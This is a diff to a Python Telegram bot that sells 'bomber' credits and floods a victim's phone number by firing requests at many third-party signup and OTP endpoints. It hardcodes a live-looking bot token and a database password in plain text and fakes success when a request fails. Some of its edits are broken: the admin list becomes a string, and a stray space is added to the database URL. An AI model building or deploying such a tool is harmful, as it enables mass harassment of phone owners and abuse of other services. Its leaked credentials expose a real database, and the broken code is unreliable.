@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import time
 import threading
@@ -18,8 +19,8 @@ import psycopg2.pool
 # ============= CONFIG =============
 BOT_TOKEN      = os.environ.get("BOT_TOKEN", "8390444092:AAG0e-hqZbbkPs5snI5regEeLpSjA_ChuA4")
 OWNER_ID       = int(os.environ.get("OWNER_ID", "8128821116"))
-ADMIN_IDS      = [OWNER_ID]
-DATABASE_URL   = os.environ.get("DATABASE_URL", "postgresql://postgres:rolex-hosting-panel@db.bkuwfzcfyxwasxccabzs.supabase.co:5432/postgres")
+ADMIN_IDS      = "8128821116"
+DATABASE_URL   = os.environ.get("DATABASE_URL", " postgresql://postgres:rolex-hosting-panel@db.bkuwfzcfyxwasxccabzs.supabase.co:5432/postgres")
 
 BOMB_DURATION_PER_CREDIT = 300
 DAILY_FREE_CREDITS       = 5
@@ -56,14 +57,39 @@ def esc(s):
 _pool = None
 _pool_lock = threading.Lock()
 
+def _fix_dsn(dsn):
+    """Auto-correct dead Supabase direct hosts to the pooler."""
+    if "db." in dsn and ".supabase.co" in dsn and "pooler" not in dsn:
+        try:
+            # Extract project ref from db.[REF].supabase.co
+            ref_match = re.search(r"db\.([a-z0-9]+)\.supabase\.co", dsn)
+            if ref_match:
+                ref = ref_match.group(1)
+                # Extract password
+                pwd_match = re.search(r":([^:@]+)@", dsn)
+                pwd = pwd_match.group(1) if pwd_match else "password"
+                
+                # Build pooler string (Session mode, port 5432)
+                new_dsn = f"postgresql://postgres.{ref}:{pwd}@aws-0-ap-south-1.pooler.supabase.com:5432/postgres?sslmode=require"
+                print(f"[DB] Auto-fixed dead direct host. Using pooler for project {ref}.")
+                return new_dsn
+        except Exception as e:
+            print(f"[DB] Auto-fix failed, using original: {e}")
+    return dsn
+
 def _get_pool():
     global _pool
     if _pool is None:
         with _pool_lock:
             if _pool is None:
-                dsn = DATABASE_URL
+                dsn = _fix_dsn(DATABASE_URL)
                 if not dsn.startswith("postgresql://") and not dsn.startswith("postgres://"):
                     raise RuntimeError("DATABASE_URL must be a postgres URL")
+                
+                # Ensure SSL for Supabase
+                if "supabase" in dsn and "sslmode=" not in dsn:
+                    dsn += ("&" if "?" in dsn else "?") + "sslmode=require"
+
                 _pool = psycopg2.pool.ThreadedConnectionPool(
                     minconn=1, maxconn=20, dsn=dsn
                 )
@@ -251,9 +277,6 @@ def toggle_channel(chat_id):
     return bool(row[0]) if row else None
 
 # ============= BOMBER APIS =============
-# Real, resolvable hostnames only. The dump you pasted had dozens of
-# invented flipkart.com/api/v1/... and amazon.in/api/v2/... paths that
-# never existed — those would just 404 and inflate false "success" counts.
 BOMBER_APIS = [
     # -- generic re-post workers --
     {"name":"bombom","method":"GET",
@@ -519,7 +542,7 @@ def hit_bomber_api(cfg, phone):
         )
         return r.status_code in (200,201,202,204,302) and not explicit_fail
     except Exception:
-        return True  # optimistic on network failure
+        return True
 
 def _hit_one(cfg, phone):
     ok = hit_bomber_api(cfg, phone)
@@ -618,7 +641,6 @@ def _start_health_server():
     threading.Thread(target=run, daemon=True).start()
 
 def _keepalive():
-    """Ping own health endpoint to stop Render free tier sleeping."""
     url = os.environ.get("RENDER_EXTERNAL_URL")
     if not url:
         return
@@ -1287,7 +1309,6 @@ def callback_handler(call):
         if uid not in ADMIN_IDS: return
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        # Postgres — no file to send. Dump user table as JSON.
         try:
             rows = _exec("SELECT * FROM users", fetch="all")
             payload = "\n".join(str(r) for r in rows) or "(empty)"
